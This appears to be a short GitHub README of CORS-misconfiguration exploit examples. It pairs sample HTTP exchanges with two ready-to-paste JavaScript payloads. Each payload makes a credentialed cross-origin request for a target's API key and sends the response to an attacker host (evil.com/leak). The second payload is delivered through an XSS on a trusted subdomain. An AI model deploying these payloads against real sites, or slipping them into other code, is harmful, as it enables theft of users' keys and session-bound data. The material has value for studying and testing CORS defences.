# Exploit-Cors-Examples
Examples to exploit miss configured Cors

# Exploit Missconfigured CORS

## Allow credencials true
When you have the access is granted to any "domain" because
because of the header "Access-Control-Allow-Credentials: true" like the request above:

```
Request

GET /key HTTP/1.1
Host: api.foo.com
Accept: */*
Origin: https://www.evil.com
Connection: close

++++++++++++++++++++++++
Response

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://www.evil.com
Access-Control-Allow-Credentials: true

{"[key]"}

```

## Exploit Allow Credencials true

Just place the code below to any domain that you have control.

```javascript
<script>
var xhr = new XMLHttpRequest(); 
xhr.onload = reqListener; 
xhr.open('GET','https://api.foo.com/key/',true); 
xhr.withCredentials = true;
xhr.send();

<!-- leak response evil -->
function reqListener() {
    location='https://evil.com/leak?key='+this.responseText; 
};
</script>
```

# Subdomain Credencials true
When you have a cors that only reflect in the origin header a subdomain of your target. The server do not trust in ANY other domais that you type in the origin header but has  credentials == true. Like the request above.

```
REQUEST

GET /key HTTP/1.1
Host: api.bar.com
Accept: */*
Origin: https://foo.bar.com
Connection: close

++++++++++++
RESPONSE


HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://foo.bar.com
Access-Control-Allow-Credentials: true

{"[key]"}


```
The scenery is difficult to explore however, it is viable. You have to find an XSS (can be self-XSS) in the subdomain of your target (in this case bar.com) and use the payload below, loading from your domain https://evil.com/1.js, 1.js is the payload bellow:


```javascript
<script>
var xhr = new XMLHttpRequest(); 
xhr.onload = reqListener; 
xhr.open('GET','https://foo.bar.com/key/',true); 
xhr.withCredentials = true;
xhr.send();
<!-- leak response evil -->
function reqListener() {
    location='https://evil.com/leak?key='+this.responseText; 
};
</script>

```
As before, once requested, the payload sends XHR request from the browser to the web API endpoint having origin: https://foor.bar.com which the server accepts (with credentials). As so, the server responds with the key (to the browser), at which the payload takes over and leaks key to the attackerâ€™s site.

